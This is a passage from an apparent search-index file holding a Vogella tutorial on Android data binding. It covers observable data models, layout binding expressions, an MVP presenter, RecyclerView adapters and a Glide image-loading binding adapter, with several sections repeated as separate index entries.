SecondActivity.class); ctx.startActivity(i); } } 3.2. Adjust layout file and activity to use data binding Change the layout to the following. <?xml version=\"1.0\" encoding=\"utf-8\"?> <layout xmlns:android=\"http://schemas.android.com/apk/res/android\"> <data> <variable name=\"temp\" type=\"com.vogella.android.databinding.TemperatureData\" /> <variable name=\"presenter\" type=\"com.vogella.android.databinding.MainActivityPresenter\"/> </data> <LinearLayout android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:orientation=\"vertical\" > <TextView android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:text=\"@={temp.location}\" /> <TextView android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:text=\"@={temp.celsius}\" /> <EditText android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:layout_marginTop=\"8dp\" android:text=\"@={temp.celsius}\" /> <Button android:text=\"Show data model\" android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:onClick=\"@{() -> presenter.onShowData(temp)}\" android:id=\"@+id/button\" /> <Button android:text=\"Start second activity\" android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:onClick=\"@{() -> presenter.showList()}\" /> </LinearLayout> </layout> 3.3. Add dependency to RecyclerView Open your app/build.gradle file and add the dependency to recyclerview. dependencies { // more compile \"com.android.support:recyclerview-v7:25.1.1\" } Ensure you pick the correct build file. You need to update the app build file. 3.4. Create icon Add an ic_listentry icon to your application. 3.5. Implement the Recyclerview with data binding. Create the following layout called activity_second.xml . <?xml version=\"1.0\" encoding=\"utf-8\"?> <layout xmlns:android=\"http://schemas.android.com/apk/res/android\"> <data> <variable name=\"temp\" type=\"com.vogella.android.databinding.TemperatureData\" /> <variable name=\"presenter\" type=\"com.vogella.android.databinding.MainActivityPresenter\"/> </data> <android.support.v7.widget.RecyclerView android:id=\"@+id/my_recycler_view\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:scrollbars=\"vertical\" /> </layout> Create the following layout called rowlayout.xml . <layout xmlns:android=\"http://schemas.android.com/apk/res/android\"> <data> <variable name=\"obj\" type=\"com.vogella.android.databinding.TemperatureData\" /> </data> <RelativeLayout android:layout_width=\"fill_parent\" android:layout_height=\"?android:attr/listPreferredItemHeight\" android:padding=\"6dip\" > <ImageView android:id=\"@+id/icon\" android:layout_width=\"wrap_content\" android:layout_height=\"fill_parent\" android:layout_alignParentBottom=\"true\" android:layout_alignParentTop=\"true\" android:layout_marginRight=\"6dip\" android:contentDescription=\"TODO\" android:src=\"@drawable/ic_listentry\" /> <TextView android:id=\"@+id/secondLine\" android:layout_width=\"fill_parent\" android:layout_height=\"26dip\" android:layout_alignParentBottom=\"true\" android:layout_alignParentRight=\"true\" android:layout_toRightOf=\"@id/icon\" android:ellipsize=\"marquee\" android:text=\"@{obj.location}\" android:textSize=\"12sp\" android:maxLines=\"1\" /> <TextView android:id=\"@+id/firstLine\" android:layout_width=\"fill_parent\" android:layout_height=\"wrap_content\" android:layout_above=\"@id/secondLine\" android:layout_alignParentRight=\"true\" android:layout_alignParentTop=\"true\" android:layout_alignWithParentIfMissing=\"true\" android:layout_toRightOf=\"@id/icon\" android:gravity=\"center_vertical\" android:text=\"@{obj.celsius}\" android:textSize=\"16sp\" /> </RelativeLayout> </layout> Create the following adapter. package com.vogella.android.databinding; import android.databinding.DataBindingUtil; import android.databinding.ViewDataBinding; import android.support.v7.widget.RecyclerView; import android.view.LayoutInflater; import android.view.ViewGroup; import com.vogella.android.databinding.databinding.RowlayoutBinding; import java.util.List; public class MyAdapter extends RecyclerView.Adapter<MyAdapter.MyViewHolder> { private List<TemperatureData> data; // Provide a reference to the views for each data item // Complex data items may need more than one view per item, and // you provide access to all the views for a data item in a view holder public class MyViewHolder extends RecyclerView.ViewHolder { // each data item is just a string in this case private final ViewDataBinding binding; public MyViewHolder(ViewDataBinding binding) { super(binding.getRoot()); this.binding = binding; } public void bind(Object obj) { binding.setVariable(BR.obj,obj); binding.executePendingBindings(); } } // Provide a suitable constructor (depends on the kind of dataset) public MyAdapter(List<TemperatureData> myDataset) { data = myDataset; } // Create new views (invoked by the layout manager) @Override public MyViewHolder onCreateViewHolder(ViewGroup parent, int viewType) { // create a new view LayoutInflater layoutInflater = LayoutInflater.from(parent.getContext()); ViewDataBinding binding = DataBindingUtil.inflate(layoutInflater, R.layout.rowlayout, parent, false); // set the view's size, margins, paddings and layout parameters return new MyViewHolder(binding); } // Replace the contents of a view (invoked by the layout manager) @Override public void onBindViewHolder(MyViewHolder holder, int position) { final TemperatureData temperatureData = data.get(position); holder.bind(temperatureData); } // Return the size of your dataset (invoked by the layout manager) @Override public int getItemCount() { return data.size(); } } Update your SecondActivity class. package com.vogella.android.databinding; import android.app.Activity; import android.os.Bundle; import android.support.v7.widget.LinearLayoutManager; import android.support.v7.widget.RecyclerView; import java.util.Arrays; import java.util.List; public class SecondActivity extends Activity { private RecyclerView recyclerView; private RecyclerView.Adapter mAdapter; private RecyclerView.LayoutManager layoutManager; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_second); recyclerView = (RecyclerView) findViewById(R.id.my_recycler_view); // use this setting to improve performance if you know that changes // in content do not change the layout size of the RecyclerView recyclerView.setHasFixedSize(true); // use a linear layout manager layoutManager = new LinearLayoutManager(this); recyclerView.setLayoutManager(layoutManager); List<TemperatureData> items = Arrays.asList(new TemperatureData(\"Hamburg\", \"5\"), new TemperatureData(\"Berlin\", \"6\")); // define an adapter mAdapter = new MyAdapter(items); recyclerView.setAdapter(mAdapter); } } 3.6. Validate your application Start your application and navigate to your second activity. Ensure the list is correctly displayed. 3.7. Optional exercise: Create an abstract class for your adapter Most of code in adapter can be the same if data binding is used. The only requirement is that the object name in the layout file is the same, so that the generated entry in the BR class is the same. In our example we use obj for it. To reuse most of our adapter, create an abstract class with the logic to bind to any object. package com.vogella.android.databinding; import android.databinding.DataBindingUtil; import android.databinding.ViewDataBinding; import android.support.v7.widget.RecyclerView; import android.view.LayoutInflater; import android.view.ViewGroup; import com.vogella.android.databinding.databinding.RowlayoutBinding; public abstract class MyBaseAdapter extends RecyclerView.Adapter<MyBaseAdapter.MyViewHolder> { // Provide a reference to the views for each data item // Complex data items may need more than one view per item, and // you provide access to all the views for a data item in a view holder public class MyViewHolder extends RecyclerView.ViewHolder { // each data item is just a string in this case private final ViewDataBinding binding; public MyViewHolder(ViewDataBinding binding) { super(binding.getRoot()); this.binding = binding; } public void bind(Object obj) { binding.setVariable(BR.obj,obj); binding.executePendingBindings(); } } @Override public MyViewHolder onCreateViewHolder(ViewGroup parent, int viewType) { // create a new view LayoutInflater layoutInflater = LayoutInflater.from(parent.getContext()); ViewDataBinding binding = DataBindingUtil.inflate(layoutInflater, getLayoutIdForType(viewType), parent, false); // set the view's size, margins, paddings and layout parameters return new MyViewHolder(binding); } // Replace the contents of a view (invoked by the layout manager) @Override public void onBindViewHolder(MyViewHolder holder, int position) { holder.bind(getDataAtPosition(position)); } public abstract Object getDataAtPosition(int position); public abstract int getLayoutIdForType(int viewType); } Now you can adjust your existing adapter to extend the MyBaseAdapter . package com.vogella.android.databinding; import java.util.List; public class MyAdapter extends MyBaseAdapter { List<TemperatureData> data; // Provide a suitable constructor (depends on the kind of dataset) public MyAdapter(List<TemperatureData> myDataset) { data = myDataset; } @Override public Object getDataAtPosition(int position) { return data.get(position); } @Override public int getLayoutIdForType(int viewType) { return R.layout.rowlayout; } @Override public int getItemCount() { return data.size(); } } Having this base adapter allows you to reuse lots of code for new adapter implementations. 3.8. Optional exercise: Use a custom converter Add a field url to your data model and use Glide to download such an image. Examples URLs for images can be found on http://lorempixel.com/ . Add the following dependency to your app/build.gradle file. compile 'com.github.bumptech.glide:glide:3.6.1' To allow Glide to download from the Internet, add the permission to use the Internet to your manifest. <uses-permission android:name=\"android.permission.INTERNET\"></uses-permission> To register a custom converter, define the following static method, either in your activity or in a separate class. @BindingAdapter(\"android:src\") public static void setImageUrl(ImageView view, String url) { Glide.with(view.getContext()). load(url). placeholder(R.drawable.ic_listentry). into(view); } Now change your data model. package com.vogella.android.databinding; import android.databinding.BaseObservable; import android.databinding.Bindable; public class TemperatureData extends BaseObservable { private String location; private String celsius; private String url; public TemperatureData(String location, String celsius, String url) { this.location = location; this.celsius = celsius; this.url = url; } @Bindable public String getCelsius() { return celsius; } @Bindable public String getLocation() { return location; } @Bindable public String getUrl() { return url; } public void setLocation(String location) { this.location = location; notifyPropertyChanged(BR.location); } public void setCelsius(String celsius) { this.celsius = celsius; notifyPropertyChanged(BR.celsius); } public void setUrl(String url) { this.url = url; notifyPropertyChanged(BR.url); } } Also adjust the construction of the data model elements. For example, for the list. List<TemperatureData> items = Arrays.asList( new TemperatureData(\"Hamburg\", \"5\", \"http://lorempixel.com/40/40/\"), new TemperatureData(\"Berlin\", \"6\",\"http://lorempixel.com/40/40/\")); Adjust the android.src attribute in your rowlayout.xml . <layout xmlns:android=\"http://schemas.android.com/apk/res/android\"> <data> <variable name=\"obj\" type=\"com.vogella.android.databinding.TemperatureData\" /> </data> <RelativeLayout android:layout_width=\"fill_parent\" android:layout_height=\"?android:attr/listPreferredItemHeight\" android:padding=\"6dip\" > <ImageView android:id=\"@+id/icon\" android:layout_width=\"wrap_content\" android:layout_height=\"fill_parent\" android:layout_alignParentBottom=\"true\" android:layout_alignParentTop=\"true\" android:layout_marginRight=\"6dip\" android:contentDescription=\"TODO\" android:src=\"@{obj.url}\" /> <TextView android:id=\"@+id/secondLine\" android:layout_width=\"fill_parent\" android:layout_height=\"26dip\" android:layout_alignParentBottom=\"true\" android:layout_alignParentRight=\"true\" android:layout_toRightOf=\"@id/icon\" android:ellipsize=\"marquee\" android:text=\"@{obj.location}\" android:textSize=\"12sp\" android:maxLines=\"1\" /> <TextView android:id=\"@+id/firstLine\" android:layout_width=\"fill_parent\" android:layout_height=\"wrap_content\" android:layout_above=\"@id/secondLine\" android:layout_alignParentRight=\"true\" android:layout_alignParentTop=\"true\" android:layout_alignWithParentIfMissing=\"true\" android:layout_toRightOf=\"@id/icon\" android:gravity=\"center_vertical\" android:text=\"@{obj.celsius}\" android:textSize=\"16sp\" /> </RelativeLayout> </layout> googletag.cmd.push(function() { googletag.display('ad-afterResources'); }); 4. Android databinding resources Androids Data Binding Library Blog about about custom setters in Data binding George Mount about Data Binding and RecyclerView Dynamic view generation with Data Binding Video introduction into Data Binding \u539f\u6587\u94fe\u63a5\uff1a https://www.vogella.com/tutorials/AndroidDatabinding/article.html","title":"Using data binding in Android"},{"location":"Android/Using%20data%20binding%20in%20Android/#1-using-data-binding-in-android-applications","text":"","title":"1. Using data binding in Android applications"},{"location":"Android/Using%20data%20binding%20in%20Android/#11-introduction-to-data-binding-in-android","text":"Android offers support to write declarative layouts using data binding. This minimizes the necessary code in your application logic to connect to the user interface elements. The usage of data binding requires changes in your layout files. Such layout files starts with a layout root tag followed by a data element and a view root element. The data elements describe data which is available for binding. This view element contains your root hierarchy similar to layout files which are not used with data binding. References to the data elements or expressions within the layout are written in the attribute properties using the @{} or @={} , <?xml version=\"1.0\" encoding=\"utf-8\"?> <layout xmlns:android=\"http://schemas.android.com/apk/res/android\"> <data> <variable name=\"temp\" type=\"com.vogella.android.databinding.TemperatureData\"/> **(1)** </data> <LinearLayout **(2)** android:orientation=\"vertical\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\"> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:text=\"@{temp.location}\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:text=\"@{temp.celsius}\"/> </LinearLayout> </layout> 1 The user variable within data describes a property that may be used within this layout. 2 Normal view hierarchy Android data binding generates a Binding class based on this layout. This class holds all the bindings from the layout properties, i.e., the defined variable to the corresponding views. It also provides generated setters for your data elements from the layout. The name of the generated class is based on the name of the layout file. This name is converted to Pascal case and the Binding suffix is added to it. For example, if the layout file is called activity_main.xml , the generate class is called ActivityMainBinding . You can inflate the layout and connect your model via this class or the DataBindingUtil class. TemperatureData temperatureData = // your data is created here ActivityMainBinding binding = DataBindingUtil.setContentView(this, R.layout.activity_main); binding.setTemp(temperatureData); // generated setter based on the data in the layout file You can use the inflate method on the generated class. This is useful for using data binding in fragments, ListView or RecyclerView . ActivityMainBinding binding = ActivityMainBinding.inflate(getLayoutInflater(), container, attachToContainer); // get the root view View view = binding.getRoot(); // do more stuff TemperatureData temperatureData = // your data is created here binding.setTemp(temperatureData); // generated setter based on the data in the layout file You can also inflate layouts for RecyclerView , ViewPager , or other things that aren\u2019t setting the Activity contents.","title":"1.1. Introduction to data binding in Android"},{"location":"Android/Using%20data%20binding%20in%20Android/#12-enable-data-binding-in-your-android-application","text":"To enable the usage of data binding in your Android application, add the following snippet to the app/build.gradle file. android { .... dataBinding { enabled = true } }","title":"1.2. Enable data binding in your Android application"},{"location":"Android/Using%20data%20binding%20in%20Android/#13-data-binding-for-events-via-listener-bindings-and-method-references","text":"Events may be bound to handler methods directly, similar to the way android:onClick can be assigned to a method in the activity. Event attribute names are governed by the name of the listener method with a few exceptions. For example, View.OnLongClickListener has a method onLongClick() , so the attribute for this event is android:onLongClick . To assign an event to its handler, use a normal binding expression, with the value being the method name to call. The binding expression can assign the click listener for a View. <?xml version=\"1.0\" encoding=\"utf-8\"?> <layout xmlns:android=\"http://schemas.android.com/apk/res/android\"> <data> <variable name=\"presenter\" type=\"com.vogella.android.databinding.MainActivityPresenter\"/> </data> <Button android:text=\"Start second activity\" android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:onClick=\"@{() -> presenter.showList()}\" /> </layout> You could also bind to a method reference via android:onClick=\"@{handlers::onClickFriend}\"/> . If you methods need parameters, you can also pass your data object to them. For example: android:onClick=\"@{(theView) -> presenter.onSaveClick(theView, task)}\"","title":"1.3. Data binding for events via listener bindings and method references"},{"location":"Android/Using%20data%20binding%20in%20Android/#14-imports","text":"You can also import classes to use them in your data binding expressions. <data> <import type=\"com.example.MyStringUtils\"/> <variable name=\"user\" type=\"com.example.User\"/> </data> <TextView android:text=\"@{MyStringUtils.capitalize(user.lastName)}\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\"/>","title":"1.4. Imports"},{"location":"Android/Using%20data%20binding%20in%20Android/#15-updating-the-user-interfaces-with-changes-from-the-data-model","text":"Any plain old Java object (POJO) can be used for data binding. But if updates in the data model should also update the user interface, the objects must be able to notify about data changes. There are three different data change notification mechanisms: * observable objects * observable fields * observable collections Android provides the BaseObservable class which you can extend. The data class is responsible for notifying when the properties change. This is done by assigning a @Bindable annotation to the getter and notifying in the setter. package com.vogella.android.databinding; import android.databinding.BaseObservable; import android.databinding.Bindable; import java.util.Observable; public class TemperatureData extends BaseObservable { private String celsius; public TemperatureData(String celsius) { this.celsius = celsius; } @Bindable **(1)** public String getCelsius() { return celsius; } public void setCelsius(String celsius) { this.celsius = celsius; notifyPropertyChanged(BR.celsius); **(2)** } } 1 Define a relevant getter 2 Notify any listeners, BR.celsius is a generated class This listener is invoked on every update and it updates the corresponding views. This ensures that updates in the model updates also the UI. Alternatively to create a observable class, you can also use ObservableField and its subclass for properties. private class TemperatureData { public final ObservableField<String> celsius = new ObservableField<>(); public final ObservableField<String> location = new ObservableField<>(); } To access such fields in your code, use the set and get methods. temp.location.set(\"Hamburg\"); String celsius = temp.celsius.get();","title":"1.5. Updating the user interfaces with changes from the data model"},{"location":"Android/Using%20data%20binding%20in%20Android/#16-custom-converters-with-bindingadapter","text":"Sometimes you have to perform complex data conversions. For this, you can register a custom converter via the static @BindingAdapter method. This method can be placed anywhere in your code and can override the default conversion of a field to your data model. For example, assume that you want to assign a field of your data model to an image view. <ImageView android:id=\"@+id/icon\" android:layout_width=\"40dp\" android:layout_height=\"fill_parent\" android:layout_alignParentBottom=\"true\" android:layout_alignParentTop=\"true\" android:layout_marginRight=\"6dip\" android:contentDescription=\"TODO\" android:src=\"@{obj.url}\" /> You can register for this property on ImageView with the following method. This method uses Glide to download the image. @BindingAdapter(\"android:src\") public static void setImageUrl(ImageView view, String url) { Glide.with(view.getContext()).load(url).into(view); } googletag.cmd.push(function() { googletag.display('ad-inBetween01'); });","title":"1.6. Custom converters with BindingAdapter"},{"location":"Android/Using%20data%20binding%20in%20Android/#2-exercise-using-data-binding-in-android-applications","text":"In this exercise you learn how to interact between your user interface widgets using data binding. Create a new Android application for this exercise, with the com.vogella.android.databinding top level package. Use the Empty template for this purpose.","title":"2. Exercise: Using data binding in Android applications"},{"location":"Android/Using%20data%20binding%20in%20Android/#21-activate-the-usage-of-data-binding","text":"Open your app/build.gradle file and activate the usage of data binding. apply plugin: 'com.android.application' android { dataBinding { enabled = true } .... [REST AS BEFORE...] Ensure you pick the correct build file. This setting must be done in the build.gradle file of your app.","title":"2.1. Activate the usage of data binding"},{"location":"Android/Using%20data%20binding%20in%20Android/#22-create-classes-for-the-view-interaction","text":"Create the following classes. package com.vogella.android.databinding; import android.databinding.BaseObservable; import android.databinding.Bindable; public class TemperatureData extends BaseObservable { private String location; private String celsius; public TemperatureData(String location, String celsius) { this.location = location; this.celsius = celsius; } @Bindable public String getCelsius() { return celsius; } @Bindable public String getLocation() { return location; } public void setLocation(String location){ this.location = location; notifyPropertyChanged(BR.location); } public void setCelsius(String celsius) { this.celsius = celsius; notifyPropertyChanged(BR.celsius); } } The BR class is not yet generated. After the definition of the layout file, the is will be generated by the Gradle tooling. package com.vogella.android.databinding; public interface MainActivityContract { public interface Presenter { void onShowData(TemperatureData temperatureData); } public interface View { void showData(TemperatureData temperatureData); } } package com.vogella.android.databinding; import android.content.Context; public class MainActivityPresenter implements MainActivityContract.Presenter { private MainActivityContract.View view; private Context ctx; public MainActivityPresenter(MainActivityContract.View view, Context ctx) { this.view = view; this.ctx = ctx; } @Override public void onShowData(TemperatureData temperatureData) { view.showData(temperatureData); } }","title":"2.2. Create classes for the view interaction"},{"location":"Android/Using%20data%20binding%20in%20Android/#23-adjust-layout-file-and-activity-to-use-data-binding","text":"Change the layout to the following. <?xml version=\"1.0\" encoding=\"utf-8\"?> <layout xmlns:android=\"http://schemas.android.com/apk/res/android\"> <data> <variable name=\"temp\" type=\"com.vogella.android.databinding.TemperatureData\" /> <variable name=\"presenter\" type=\"com.vogella.android.databinding.MainActivityPresenter\"/> </data> <LinearLayout android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:orientation=\"vertical\" > <TextView android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:text=\"@={temp.location}\" /> <TextView android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:text=\"@={temp.celsius}\" /> <EditText android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:layout_marginTop=\"8dp\" android:text=\"@={temp.celsius}\" /> <Button android:text=\"Show data model\" android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:onClick=\"@{() -> presenter.onShowData(temp)}\" android:id=\"@+id/button\" /> </LinearLayout> </layout> You see some warning messages in the editor, e.g., because you used hard-codes strings. For this exercise, we ignore these warnings. Adjust your activity code to use the generated data binding classes. package com.vogella.android.databinding; import android.app.Activity; import android.content.Intent; import android.databinding.DataBindingUtil; import android.os.Bundle; import android.widget.Toast; import com.vogella.android.databinding.databinding.ActivityMainBinding; public class MainActivity extends Activity implements MainActivityContract.View { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); ActivityMainBinding binding = DataBindingUtil.setContentView(this, R.layout.activity_main); MainActivityPresenter mainActivityPresenter = new MainActivityPresenter(this, getApplicationContext()); TemperatureData temperatureData = new TemperatureData(\"Hamburg\", \"10\"); binding.setTemp(temperatureData); binding.setPresenter(mainActivityPresenter); } @Override public void showData(TemperatureData temperatureData) { String celsius = temperatureData.getCelsius(); Toast.makeText(this, celsius, Toast.LENGTH_SHORT).show(); } }","title":"2.3. Adjust layout file and activity to use data binding"},{"location":"Android/Using%20data%20binding%20in%20Android/#24-convince-android-studio-to-compile-your-application","text":"If the BR class is missing, select Build Clean followed by Build Make Project .","title":"2.4. Convince Android Studio to compile your application"},{"location":"Android/Using%20data%20binding%20in%20Android/#25-validate-your-application","text":"Start your application. If you press the button, a small popup should be shown with the correct data. The first text view should The second TextView should update automatically, if you type in the EditText field.","title":"2.5. Validate your application"},{"location":"Android/Using%20data%20binding%20in%20Android/#3-exercise-using-data-binding-for-recyclerview","text":"In this exercise you learn how to use data binding for a recyclerview. Continue to use the com.vogella.android.databinding package.","title":"3. Exercise: Using data binding for RecyclerView"},{"location":"Android/Using%20data%20binding%20in%20Android/#31-define-a-new-activity-and-allow-to-start-it","text":"Create a new activity called SecondActivity . Ensure that you add it to your Android manifest. Adjust your MVP contract to start the second activity. package com.vogella.android.databinding; public interface MainActivityContract { public interface Presenter { void onShowData(TemperatureData temperatureData); void showList(); } public interface View { void showData(TemperatureData temperatureData); } } Implement this new behavior in MainActivityPresenter to start the second activity. package com.vogella.android.databinding; import android.content.Context; import android.content.Intent; public class MainActivityPresenter implements MainActivityContract.Presenter { private MainActivityContract.View view; private Context ctx; public MainActivityPresenter(MainActivityContract.View view, Context ctx) { this.view = view; this.ctx = ctx; } @Override public void onShowData(TemperatureData temperatureData) { view.showData(temperatureData); } @Override public void showList() { Intent i = new Intent(ctx, SecondActivity.class); ctx.startActivity(i); } }","title":"3.1. Define a new activity and allow to start it"},{"location":"Android/Using%20data%20binding%20in%20Android/#32-adjust-layout-file-and-activity-to-use-data-binding","text":"Change the layout to the following. <?xml version=\"1.0\" encoding=\"utf-8\"?> <layout xmlns:android=\"http://schemas.android.com/apk/res/android\"> <data> <variable name=\"temp\" type=\"com.vogella.android.databinding.TemperatureData\" /> <variable name=\"presenter\" type=\"com.vogella.android.databinding.MainActivityPresenter\"/> </data> <LinearLayout android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:orientation=\"vertical\" > <TextView android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:text=\"@={temp.location}\" /> <TextView android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:text=\"@={temp.celsius}\" /> <EditText android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:layout_marginTop=\"8dp\" android:text=\"@={temp.celsius}\" /> <Button android:text=\"Show data model\" android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:onClick=\"@{() -> presenter.onShowData(temp)}\" android:id=\"@+id/button\" /> <Button android:text=\"Start second activity\" android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:onClick=\"@{() -> presenter.showList()}\" /> </LinearLayout> </layout>","title":"3.2. Adjust layout file and activity to use data binding"},{"location":"Android/Using%20data%20binding%20in%20Android/#33-add-dependency-to-recyclerview","text":"Open your app/build.gradle file and add the dependency to recyclerview. dependencies { // more compile \"com.android.support:recyclerview-v7:25.1.1\" } Ensure you pick the correct build file. You need to update the app build file.","title":"3.3. Add dependency to RecyclerView"},{"location":"Android/Using%20data%20binding%20in%20Android/#34-create-icon","text":"Add an ic_listentry icon to your application.","title":"3.4. Create icon"},{"location":"Android/Using%20data%20binding%20in%20Android/#35-implement-the-recyclerview-with-data-binding","text":"Create the following layout called activity_second.xml . <?xml version=\"1.0\" encoding=\"utf-8\"?> <layout xmlns:android=\"http://schemas.android.com/apk/res/android\"> <data> <variable name=\"temp\" type=\"com.vogella.android.databinding.TemperatureData\" /> <variable name=\"presenter\" type=\"com.vogella.android.databinding.MainActivityPresenter\"/> </data> <android.support.v7.widget.RecyclerView android:id=\"@+id/my_recycler_view\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:scrollbars=\"vertical\" /> </layout> Create the following layout called rowlayout.xml . <layout xmlns:android=\"http://schemas.android.com/apk/res/android\"> <data> <variable name=\"obj\" type=\"com.vogella.android.databinding.TemperatureData\" /> </data> <RelativeLayout android:layout_width=\"fill_parent\" android:layout_height=\"?android:attr/listPreferredItemHeight\" android:padding=\"6dip\" > <ImageView android:id=\"@+id/icon\" android:layout_width=\"wrap_content\" android:layout_height=\"fill_parent\" android:layout_alignParentBottom=\"true\" android:layout_alignParentTop=\"true\" android:layout_marginRight=\"6dip\" android:contentDescription=\"TODO\" android:src=\"@drawable/ic_listentry\" /> <TextView android:id=\"@+id/secondLine\" android:layout_width=\"fill_parent\" android:layout_height=\"26dip\" android:layout_alignParentBottom=\"true\" android:layout_alignParentRight=\"true\" android:layout_toRightOf=\"@id/icon\" android:ellipsize=\"marquee\" android:text=\"@{obj.location}\" android:textSize=\"12sp\" android:maxLines=\"1\" /> <TextView android:id=\"@+id/firstLine\" android:layout_width=\"fill_parent\" android:layout_height=\"wrap_content\" android:layout_above=\"@id/secondLine\" android:layout_alignParentRight=\"true\" android:layout_alignParentTop=\"true\" android:layout_alignWithParentIfMissing=\"true\" android:layout_toRightOf=\"@id/icon\" android:gravity=\"center_vertical\" android:text=\"@{obj.celsius}\" android:textSize=\"16sp\" /> </RelativeLayout> </layout> Create the following adapter. package com.vogella.android.databinding; import android.databinding.DataBindingUtil; import android.databinding.ViewDataBinding; import android.support.v7.widget.RecyclerView; import android.view.LayoutInflater; import android.view.ViewGroup; import com.vogella.android.databinding.databinding.RowlayoutBinding; import java.util.List; public class MyAdapter extends RecyclerView.Adapter<MyAdapter.MyViewHolder> { private List<TemperatureData> data; // Provide a reference to the views for each data item // Complex data items may need more than one view per item, and // you provide access to all the views for a data item in a view holder public class MyViewHolder extends RecyclerView.ViewHolder { // each data item is just a string in this case private final ViewDataBinding binding; public MyViewHolder(ViewDataBinding binding) { super(binding.getRoot()); this.binding = binding; } public void bind(Object obj) { binding.setVariable(BR.obj,obj); binding.executePendingBindings(); } } // Provide a suitable constructor (depends on the kind of dataset) public MyAdapter(List<TemperatureData> myDataset) { data = myDataset; } // Create new views (invoked by the layout manager) @Override public MyViewHolder onCreateViewHolder(ViewGroup parent, int viewType) { // create a new view LayoutInflater layoutInflater = LayoutInflater.from(parent.getContext()); ViewDataBinding binding = DataBindingUtil.inflate(layoutInflater, R.layout.rowlayout, parent, false); // set the view's size, margins, paddings and layout parameters return new MyViewHolder(binding); } // Replace the contents of a view (invoked by the layout manager) @Override public void onBindViewHolder(MyViewHolder holder, int position) { final TemperatureData temperatureData = data.get(position); holder.bind(temperatureData); } // Return the size of your dataset (invoked by the layout manager) @Override public int getItemCount() { return data.size(); } } Update your SecondActivity class. package com.vogella.android.databinding; import android.app.Activity; import android.os.Bundle; import android.support.v7.widget.LinearLayoutManager; import android.support.v7.widget.RecyclerView; import java.util.Arrays; import java.util.List; public class SecondActivity extends Activity { private RecyclerView recyclerView; private RecyclerView.Adapter mAdapter; private RecyclerView.LayoutManager layoutManager; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_second); recyclerView = (RecyclerView) findViewById(R.id.my_recycler_view); // use this setting to improve performance if you know that changes // in content do not change the layout size of the RecyclerView recyclerView.setHasFixedSize(true); // use a linear layout manager layoutManager = new LinearLayoutManager(this); recyclerView.setLayoutManager(layoutManager); List<TemperatureData> items = Arrays.asList(new TemperatureData(\"Hamburg\", \"5\"), new TemperatureData(\"Berlin\", \"6\")); // define an adapter mAdapter = new MyAdapter(items); recyclerView.setAdapter(mAdapter); } }","title":"3.5. Implement the Recyclerview with data binding."},{"location":"Android/Using%20data%20binding%20in%20Android/#36-validate-your-application","text":"Start your application and navigate to your second activity. Ensure the list is correctly displayed.","title":"3.6. Validate your application"},{"location":"Android/Using%20data%20binding%20in%20Android/#37-optional-exercise-create-an-abstract-class-for-your-adapter","text":"Most of code in adapter can be the same if data binding is used. The only requirement is that the object name in the layout file is the same, so that the generated entry in the BR class is the same. In our example we use obj for it. To reuse most of our adapter, create an abstract class with the logic to bind to any object. package com.vogella.android.databinding; import android.databinding.DataBindingUtil; import android.databinding.ViewDataBinding; import android.support.v7.widget.RecyclerView; import android.view.LayoutInflater; import android.view.ViewGroup; import com.vogella.android.databinding.databinding.RowlayoutBinding; public abstract class MyBaseAdapter extends RecyclerView.Adapter<MyBaseAdapter.MyViewHolder> { // Provide a reference to the views for each data item // Complex data items may need more than one view per item, and // you provide access to all the views for a data item in a view holder public class MyViewHolder extends RecyclerView.ViewHolder { // each data item is just a string in this case private final ViewDataBinding binding; public MyViewHolder(ViewDataBinding binding) { super(binding.getRoot()); this.binding = binding; } public void bind(Object obj) { binding.setVariable(BR.obj,obj); binding.executePendingBindings(); } } @Override public MyViewHolder onCreateViewHolder(ViewGroup parent, int viewType) { // create a new view LayoutInflater layoutInflater = LayoutInflater.from(parent.getContext()); ViewDataBinding binding = DataBindingUtil.inflate(layoutInflater, getLayoutIdForType(viewType), parent, false); // set the view's size, margins, paddings and layout parameters return new MyViewHolder(binding); } // Replace the contents of a view (invoked by the layout manager) @Override public void onBindViewHolder(MyViewHolder holder, int position) { holder.bind(getDataAtPosition(position)); } public abstract Object getDataAtPosition(int position); public abstract int getLayoutIdForType(int viewType); } Now you can adjust your existing adapter to extend the MyBaseAdapter . package com.vogella.android.databinding; import java.util.List; public class MyAdapter extends MyBaseAdapter { List<TemperatureData> data; // Provide a suitable constructor (depends on the kind of dataset) public MyAdapter(List<TemperatureData> myDataset) { data = myDataset; } @Override public Object getDataAtPosition(int position) { return data.get(position); } @Override public int getLayoutIdForType(int viewType) { return R.layout.rowlayout; } @Override public int getItemCount() { return data.size(); } } Having this base adapter allows you to reuse lots of code for new adapter implementations.","title":"3.7. Optional exercise: Create an abstract class for your adapter"},{"location":"Android/Using%20data%20binding%20in%20Android/#38-optional-exercise-use-a-custom-converter","text":"Add a field url to your data model and use Glide to download such an image. Examples URLs for images can be found on http://lorempixel.com/ . Add the following dependency to your app/build.gradle file. compile 'com.github.bumptech.glide:glide:3.6.1' To allow Glide to download from the 